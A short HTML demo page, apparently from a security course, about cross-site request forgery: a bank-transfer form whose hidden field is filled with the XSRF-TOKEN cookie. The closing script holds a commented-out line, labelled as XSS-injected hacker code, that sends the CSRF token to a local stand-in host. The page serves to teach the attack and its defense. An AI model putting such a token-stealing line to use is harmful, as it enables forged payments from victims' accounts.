<html>
<body>
<h2>Cross-Site Request Forgery (CSRF)</h2>

<h4>Transfer Money via FORM method=POST</h4>
This technique was used prior to Single-Page-Apps, in server-side rendered websites (eg. .jsp, .jsf, Vaadin)
<form method="post" action="/api/victim/transfer-form">
    Recipient Full Name:<input type="text" name="recipientFullName" value="John Doe"/> <br/>
    Recipient IBAN number:<input type="text" name="recipientIban" value="12345678900"/> <br/>
    Amount:<input type="text" name="amount" value="100"/> EUR<br/>
    <input type="hidden" name="_csrf" id="csrfTokenField"/> <br/>
    <input type="submit" value="Transfer">
</form>

<script type="text/javascript">
    function getCookie(name) {
        const value = `; ${document.cookie}`;
        const parts = value.split(`; ${name}=`);
        if (parts.length === 2) return parts.pop().split(';').shift();
    }

    let csrfToken = getCookie("XSRF-TOKEN");

    document.getElementById("csrfTokenField").value = csrfToken;

    // hacker script injected via XSS
    //fetch("http://localhost:9999/stolenCsrf?"+csrfToken);
</script>
</body>
</html>
